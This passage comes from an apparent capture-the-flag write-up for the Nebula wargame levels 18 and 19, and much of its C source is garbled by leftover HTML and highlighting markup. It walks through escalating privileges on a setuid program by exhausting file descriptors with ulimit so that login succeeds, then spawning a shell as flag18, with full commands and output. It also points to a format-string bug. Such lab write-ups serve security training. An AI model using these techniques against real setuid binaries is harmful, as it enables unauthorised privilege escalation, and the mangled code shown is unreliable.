</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">sprintf</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">unable</span> <span class="n">to</span> <span class="n">set</span> <span class="n">user</span> <span class="n">to</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">%</span><span class="n">s</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">ndash</span><span class="p">;</span> <span class="n">not</span> <span class="n">supported</span><span class="p">.</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">user</span><span class="p">);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">msg</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">c</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">while</span><span class="p">((</span><span class="n">c</span> <span class="o">=</span> <span class="n">getopt</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nl">d</span><span class="p">:</span><span class="n">v</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">switch</span><span class="o">&amp;</span><span class="n">copy</span><span class="p">;</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">case</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">d</span><span class="err">&#39;</span><span class="o">:</span>
</span><span class='line'>              <span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">optarg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">w</span><span class="o">+&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>              <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">open</span> <span class="o">%</span><span class="n">s</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">optarg</span><span class="p">);</span>
</span><span class='line'>              <span class="n">setvbuf</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
</span><span class='line'>          <span class="k">case</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">v</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">:</span>
</span><span class='line'>              <span class="n">globals</span><span class="p">.</span><span class="n">verbose</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">dprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Starting</span> <span class="n">up</span><span class="p">.</span> <span class="n">Verbose</span> <span class="n">level</span> <span class="o">=</span> <span class="o">%</span><span class="n">d</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">globals</span><span class="p">.</span><span class="n">verbose</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">setresgid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>      <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">p</span><span class="p">,</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">q</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="n">q</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">q</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span><span class='line'>  <span class="n">p</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">&#39;\n&#39;</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">p</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">&#39;\r&#39;</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">dvprintf</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">&quot;got [%s] as input</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">line</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;login&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">dvprintf</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">&quot;attempting to login</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="n">login</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">6</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;logout&quot;</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;shell&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">dvprintf</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">&quot;attempting to start shell</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span><span class='line'>          <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;unable to execve&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="n">dprintf</span><span class="p">(</span><span class="s">&quot;Permission denied</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;logout&quot;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;closelog&quot;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">)</span> <span class="n">fclose</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">);</span>
</span><span class='line'>      <span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;site exec&quot;</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">notsupported</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">10</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;setuser&quot;</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">setuser</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>First thing that we tried was to use parameter <code>-d /home/flag18/password</code> to
rewrite password file with the known output, however the <code>strcmp()</code> doesn&rsquo;t match
for the reason that we cannot insert the newline character to the end of our string.</p>

<p>The <code>fclose()</code> on line 34 is not aligned, that&rsquo;s strange. We found out that this call is not used in the binary file:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ gdb -batch -ex &lsquo;file /home/flag18/flag18&rsquo; -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;disassemble login&rsquo; | grep close
</span><span class='line'>sh-4.2$</span></code></pre></td></tr></table></div></figure></p>

<p>We can use login function to exhaust file descriptors, because when the <code>fopen()</code> fails, we will be logged in. After a few tries:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ help ulimit
</span><span class='line'>[..snip..]
</span><span class='line'>      -n        the maximum number of open file descriptors
</span><span class='line'>[..snip..]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ ulimit -n 8&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ /home/flag18/flag18 -d /dev/tty -vvv
</span><span class='line'>Starting up. Verbose level = 3
</span><span class='line'>login
</span><span class='line'>got [login] as input
</span><span class='line'>attempting to login
</span><span class='line'>login
</span><span class='line'>got [login] as input
</span><span class='line'>attempting to login
</span><span class='line'>login
</span><span class='line'>got [login] as input
</span><span class='line'>attempting to login
</span><span class='line'>login
</span><span class='line'>got [login] as input
</span><span class='line'>attempting to login
</span><span class='line'>login
</span><span class='line'>got [login] as input
</span><span class='line'>attempting to login
</span><span class='line'>logged in successfully (without password file)
</span><span class='line'>closelog
</span><span class='line'>got [closelog] as input
</span><span class='line'>shell
</span><span class='line'>/home/flag18/flag18: -d: invalid option
</span><span class='line'>Usage:  /home/flag18/flag18 [GNU long option] [option] &hellip;
</span><span class='line'>        /home/flag18/flag18 [GNU long option] [option] script-file &hellip;
</span><span class='line'>GNU long options:
</span><span class='line'>        &ndash;debug
</span><span class='line'>        &ndash;debugger
</span><span class='line'>        &ndash;dump-po-strings
</span><span class='line'>        &ndash;dump-strings
</span><span class='line'>        &ndash;help
</span><span class='line'>        &ndash;init-file
</span><span class='line'>        &ndash;login
</span><span class='line'>        &ndash;noediting
</span><span class='line'>        &ndash;noprofile
</span><span class='line'>        &ndash;norc
</span><span class='line'>        &ndash;posix
</span><span class='line'>        &ndash;protected
</span><span class='line'>        &ndash;rcfile
</span><span class='line'>        &ndash;restricted
</span><span class='line'>        &ndash;verbose
</span><span class='line'>        &ndash;version
</span><span class='line'>Shell options:
</span><span class='line'>        -irsD or -c command or -O shopt_option          (invocation only)
</span><span class='line'>        -abefhkmnptuvxBCHP or -o option</span></code></pre></td></tr></table></div></figure></p>

<p>We used <code>closelog</code> to close one used descriptor and the shell is invoked,
unfortunately we need to get rid of -d parameter too, bash is recycling
our argv, see <code>execve("/bin/sh", argv, envp);</code>.</p>

<p>We tried <code>--init-file</code> as it has the second argument some file:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ ulimit -n 5&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ /home/flag18/flag18 &ndash;init-file -d /dev/tty -vvv
</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &lsquo;-&rsquo;
</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &lsquo;i&rsquo;
</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &lsquo;n&rsquo;
</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &lsquo;i&rsquo;
</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &rsquo;t'
</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &lsquo;-&rsquo;
</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &lsquo;f&rsquo;
</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &lsquo;i&rsquo;
</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &lsquo;l&rsquo;
</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &lsquo;e&rsquo;
</span><span class='line'>Starting up. Verbose level = 3
</span><span class='line'>login
</span><span class='line'>got [login] as input
</span><span class='line'>attempting to login
</span><span class='line'>login
</span><span class='line'>got [login] as input
</span><span class='line'>attempting to login
</span><span class='line'>logged in successfully (without password file)
</span><span class='line'>closelog
</span><span class='line'>got [closelog] as input
</span><span class='line'>shell
</span><span class='line'>id
</span><span class='line'>uid=981(flag18) gid=1019(level18) groups=981(flag18),1019(level18)
</span><span class='line'>getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure></p>

<p>Second way is to use format string exploitation, line 48 is vulnerable at <code>notsupported()</code> function.</p>

<p>For debugging, we downloaded <code>gdb-peda</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git clone &lt;a href="https://github.com/longld/peda.git">https://github.com/longld/peda.git&lt;/a> ~/peda
</span><span class='line'>echo &ldquo;source ~/peda/peda.py&rdquo; >> ~/.gdbinit</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/tmp$ gdb -q /home/flag18/flag18
</span><span class='line'>Reading symbols from /home/flag18/flag18&hellip;(no debugging symbols found)&hellip;done.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb-peda$ checksec
</span><span class='line'>CANARY    : ENABLED
</span><span class='line'>FORTIFY   : ENABLED
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : Partial</span></code></pre></td></tr></table></div></figure></p>

<p>Because the Fortify2, there was no easy way to solve it, technique from
<a href="http://phrack.org/issues/67/9.html">phrack #67</a> could be very useful.</p>

<p>There is also buffer overflow in <code>setuser()</code> function, that doesn&rsquo;t seem to be exploitable.</p>

<h2>Level19</h2>

<p><figure class='code'><figcaption><span>level19.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">fcntl</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">stat</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">pid_t</span> <span class="n">pid</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">stat</span> <span class="n">statbuf</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Get</span> <span class="n">the</span> <span class="n">parent</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">s</span> <span class="o">/</span><span class="n">proc</span> <span class="n">entry</span><span class="p">,</span> <span class="n">so</span> <span class="n">we</span> <span class="n">can</span> <span class="n">verify</span> <span class="n">its</span> <span class="n">user</span> <span class="n">id</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span><span class="n">proc</span><span class="o">/%</span><span class="n">d</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">getppid</span><span class="p">());</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">stat</span><span class="p">()</span> <span class="n">it</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">stat</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">statbuf</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">check</span> <span class="n">parent</span> <span class="n">process</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
